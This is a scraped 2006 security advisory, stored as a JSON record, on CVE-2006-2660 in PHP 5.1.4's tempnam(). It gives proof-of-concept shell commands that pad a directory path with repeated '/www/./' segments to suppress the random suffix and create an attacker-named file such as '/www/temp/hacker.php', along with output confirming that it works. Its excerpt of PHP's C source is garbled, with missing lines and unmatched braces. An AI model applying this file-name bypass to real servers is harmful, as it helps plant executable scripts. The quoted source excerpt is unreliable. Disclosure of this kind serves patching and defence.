{
    "text": "vul_name : PHP 5.1.4 tempnam (  ) Bypass unique file name ， vul_cve : CVE-2006-2660 ， vul_poc :  [ tempnam (  ) Bypass unique file name PHP 5.1.4 ]  ， Author : Maksymilian Arciemowicz ， Date :  ， - -Written : 22.5.2006 ， - -Public : 11.6.2006 ， CVE-2006-2660 ， - - 0.Description - ， PHP is an HTML-embedded scripting language. Much of its syntax is borrowed from C , Java and Perl with a couple of unique PHP-specific features thrown in. The goal of the language is to allow web developers to write dynamically generated pages quickly. ， A nice introduction to PHP by Stig S& # 230 ; ther Bakken can be found at on the Zend website. Also , much of the PHP Conference Material is freely available. ， tempnam - Create file with unique file name. ， - - 1. tempnam (  ) Bypass unique file name - ， In lastes adv i have public an issue \"Open Basedir Bypass\". In function tempname (  ) are required 2 arg`s. ， string tempnam ( string dir , string prefix )  ， In PHP 5.1.4 exists bug that allows you to create file with any name. ， cxib # php -r 'echo tempnam ( \"/www/temp/\" , \"hacker.php\" ) .\"\\n\" ; ' ， /www/temp/hacker.phpGQMqSE ， You have created file /www/temp/hacker.phpGQMqSE. \"GQMqSE\" is automatically added to filename. ， Problem exists , because path couldn't be longer than MAXPATHLEN. In standard MAXPATHLEN is 1024B. ， - -771-805- ， PHP_FUNCTION ( tempnam )  ， { ， zval arg1 , arg2 ;  ， char * d ;  ， char * opened_path ;  ， char * p ;  ， int fd ;  ， size_t p_len ;  ， WRONG_PARAM_COUNT ;  ， } ， convert_to_string_ex ( arg1 )  ;  ， convert_to_string_ex ( arg2 )  ;  ， RETURN_FALSE ;  ， } ， d = estrndup ( Z_STRVAL_PP ( arg1 )  , Z_STRLEN_PP ( arg1 )  ;  ， php_basename ( Z_STRVAL_PP ( arg2 )  , Z_STRLEN_PP ( arg2 )  , NULL , 0 , &p , &p_len TSRMLS_CC )  ;  ， p [ 63 ] = '\\0' ;  ， } ， close ( fd )  ;  ， RETVAL_STRING ( opened_path , 0 )  ;  ， } else { ， RETVAL_FALSE ;  ， } ， efree ( p )  ;  ， efree ( d )  ;  ， } ， - -771-805- ， So if you create path like /www/./www/. etc. ， arg1+arg2=1023 ， uniqueid is not given to path. ， Example :  ， cxib # php -r 'echo tempnam ( \"/www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./dupa/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./dupa/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/temp/\" , \"hacker.php\" ) .\"\\n\" ; ' ， /www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./dupa/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./dupa/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/./www/temp/hacker.php ， = /www/temp/hacker.php ， cxib # ls -la /www/temp/hacker *  ， - -rw- 1 cxib cxib 0 May 22 23 : 33 /www/temp/hacker.php ， - -rw- 1 cxib cxib 0 May 22 23 : 26 /www/temp/hacker.phpGQMqSE ， - - 2. How to fix - ， CVS ， - - 3. Contact - ， Author : Maksymilian Arciemowicz",
    "time": "2006.06.11"
}